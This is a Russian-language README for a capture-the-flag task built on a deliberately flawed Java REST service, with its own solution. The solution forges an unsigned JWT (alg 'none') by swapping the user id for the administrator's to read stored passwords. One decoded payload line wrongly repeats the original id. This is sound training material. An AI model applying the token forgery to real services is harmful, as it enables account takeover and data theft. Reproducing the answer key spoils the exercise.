# JAVA AUTH
## Legend

День до сдачи, все дела... Ситуация знакома каждому. А когда времени остается очень мало... 
Приходится писать костыли. Тот кто писал это приложение явно не знал как работают JWT токены.

## Description
Дано REST приложение, написанное на java.

Спецификацию API можно посмотреть по url:
`http://localhost:8081/swagger-ui/index.html`

Логин пароль тестового пользователя: tester : 123qwerty
Токен требуется отправлять так же как он приходит(со словом Bearer)
Задача: получить флаг. Флагом является один из сохраненных администратором паролей.

## Flag and port
И то и другое указывается в application.property
## Сборка
Для удобства вынесена в докер файл. Обязательно пересоберите все после замены флага `docker build -t auth .`

## Запуск
Выполните команду `docker run -p 8081:8081 --rm -it auth:latest`

## Solution
Для решения задачи требуется через swagger отправить запрос sing-in

После требуется получить список пользователей и запомнить его id


В payload токена подменяем свой id на id администратора и получаем все необходимые данные.

Пример. Получаем токен: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJ0ZXN0ZXIiLCJleHAiOjE2ODUyNjI3NzMsImlkIjoiZWI5MGUxYjAtZTdhOC00NDA0LWFhYmItZmY1ZmE2NDIwYWYxIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c


Payload eyJzdWIiOiJ0ZXN0ZXIiLCJleHAiOjE2ODUyNjI3NzMsImlkIjoiZWI5MGUxYjAtZTdhOC00NDA0LWFhYmItZmY1ZmE2NDIwYWYxIn0


Payload decoded {"sub":"tester","exp":1685262773,"id":"eb90e1b0-e7a8-4404-aabb-ff5fa6420af1"}

Payload new decoded {"sub":"tester","exp":1685262773,"id":"eb90e1b0-e7a8-4404-aabb-ff5fa6420af1"}


Payload new eyJzdWIiOiJ0ZXN0ZXIiLCJleHAiOjE2ODUyNjI3NzMsImlkIjoiY2Q5NTcxOGUtOTMzNy00NjdlLTgwMjktYzAxZWM1YmI2MWU0In0=


new token Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJ0ZXN0ZXIiLCJleHAiOjE2ODUyNjI3NzMsImlkIjoiY2Q5NTcxOGUtOTMzNy00NjdlLTgwMjktYzAxZWM1YmI2MWU0In0=.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c



